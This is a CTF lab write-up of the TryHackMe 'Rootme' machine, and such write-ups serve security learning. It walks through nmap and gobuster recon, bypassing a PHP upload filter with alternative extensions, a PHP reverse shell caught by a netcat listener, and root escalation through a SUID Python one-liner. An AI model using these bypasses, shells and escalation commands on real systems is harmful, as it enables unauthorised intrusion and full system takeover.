---
title: TryHackMe - Rootme
date: 2025-01-15 20:00:00 +0530
categories: [TryHackMe, CTF]
tags: [php,file upload vulnerability,privilege escalation]     
description: Exploited a simple file upload vulnerability to gain a reverse shell and used SUID to escalate privileges
# toc: false
comments: false
# pin: true
---

## Recon

### namp scan
First, I obtained an IP address, let’s assume 10.10.11.11. With only the IP address in hand, the first step is to perform an Nmap scan to identify the open ports on the target.

```bash
blackm4c:~ nmap -sVC 10.10.11.11

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 20:00 IST
Nmap scan report for 10.10.11.11
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}

Using an Nmap port scan, I discovered two open ports: `port 22 (SSH)` and port `80 (HTTP)`. Since port 80 is open, it indicates a web server is running. Let’s explore the website to gather more information.

## Website Recon

After inspecting the website, I found it to be just a static page with nothing interesting. I checked the page cookies, but no cookies were set. Then, I reviewed the page source code, which revealed two directories: `/css/` and `/js/`. After examining the CSS and JS files, I found nothing of interest, so I decided to explore further by performing a directory brute force scan using Gobuster to uncover hidden directories.

### Directory Brute Force with Gobuster

```bash
blackm4c:~ gobuster dir -u http://10.10.11.11 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.11
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 316] [--> http://10.10.11.11/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.11.11/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.11.11/js/]
/panel                (Status: 301) [Size: 314] [--> http://10.10.11.11/panel/]
Progress: 220561 / 220561 (100%)
===============================================================
Finished
===============================================================

```
{: .nolineno}
The scan revealed two interesting directories: `/uploads` and `/panel`. I navigated to the `/panel` directory and found a file upload functionality. My first thought was to test for file upload vulnerabilities.

## Exploitation

I uploaded various files, and the application accepted image files and text files. After uploading, a message appeared with a link to check the file. Clicking the link displayed the uploaded file in the `/uploads/` directory, e.g., `/uploads/image.png`.

Next, I tried uploading a PHP file, but it was rejected with a message saying PHP files were not allowed. To bypass this restriction, I researched file upload bypass techniques and found a list of alternative `PHP` extensions that could be accepted by the server:

### PHP File Upload Restriction Bypass
```
PHP -> php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
```

I renamed my PHP file to use the .php5 extension. Using a PHP reverse shell script from [github](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), I modified the IP and port to match my machine. After uploading the .php5 file, I checked the /uploads directory and confirmed that the file was successfully uploaded.

I started a Netcat listener and accessed the uploaded PHP file to trigger the reverse shell.

### Reverse Shell with PHP
```bash
blackm4c:~ nc -lvnp 5555

listening on [any] 5555 ...
connect to [10.17.134.111] from (UNKNOWN) [10.10.11.11] 51072
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:12:04 up 43 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```
{: .nolineno}

After gaining shell access as the `www-data` user, I checked the `/home` directory for the `user.txt` file but found nothing. I used the find command to locate it:

```bash
$ find / -type f -name user.txt 2> /dev/null
/var/www/user.txt
```
{: .nolineno}
The `user.txt` file was located in the `/var/www/` directory.

## Privilage Escapulation

To escalate privileges, I first checked for sudo permissions using `sudo -l`, but it required a password. Next, I searched for programs with the `SUID` bit set:

```bash
$ find / -user root -perm /4000 2> /dev/null
.
.
.
/usr/bin/chsh
/usr/bin/python
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
.
.
.
```
{: .nolineno}

Among the results, I noticed the Python binary. I referred to [gtfobins](https://gtfobins.github.io/) for a privilege escalation exploit and found the following command:

### Python SUID Exploitation for Privilege Escalation
```bash
$ ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

#whomai
root
```
{: .nolineno}

Executing this command gave me a root shell. I navigated to the `/root` directory and retrieved the `root.txt` file.

## Conclusion

This challenge involved identifying open ports, inspecting web applications, exploiting file upload vulnerabilities, and performing privilege escalation to gain root access. It demonstrates the importance of securing web servers, validating file uploads, and managing permissions for binaries with elevated privileges.

## Reference

- <https://portswigger.net/web-security/file-upload>
- <https://gtfobins.github.io/gtfobins/python/>
- <https://www.redhat.com/en/blog/suid-sgid-sticky-bit>



